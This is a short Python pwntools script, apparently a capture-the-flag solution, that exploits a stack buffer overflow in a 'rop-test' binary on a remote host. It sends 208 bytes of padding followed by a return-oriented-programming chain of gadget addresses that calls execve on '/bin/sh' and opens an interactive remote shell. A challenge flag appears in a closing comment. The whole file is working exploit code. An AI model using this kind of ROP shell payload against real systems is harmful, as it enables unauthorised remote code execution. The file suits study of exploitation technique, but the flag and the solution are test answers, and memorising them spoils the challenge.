#!/usr/bin/env python3
import pwn
import vpn_conf

HOST = vpn_conf.HOST
PORT = int(vpn_conf.BASE_PORT + 12)
BIN = "./rop-test_thaMilo"
OFFSET = 208
RET = 0x40101A
POP_RAX = 0x4011C7
POP_RBX = 0x4011C2
POP_RCX = 0x4011C5
POP_RDI_RBX = 0x4011C0
POP_RDX = 0x4011DE
SYSCALL = 0x4011AF
BIN_SH = 0x402051
XOR_RSI = 0x4011B5


def exploit():
    p = pwn.remote(HOST, PORT)
    payload = (
        b"A" * OFFSET
        + pwn.p64(RET)
        + pwn.p64(POP_RAX)
        + pwn.p64(59)
        + pwn.p64(POP_RDI_RBX)
        + pwn.p64(BIN_SH)
        + pwn.p64(0)
        + pwn.p64(XOR_RSI)
        + pwn.p64(POP_RDX)
        + pwn.p64(0)
        + pwn.p64(SYSCALL)
    )
    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    exploit()

# BASC{c0d3_r3U5e_FtW___c4OfU73e}
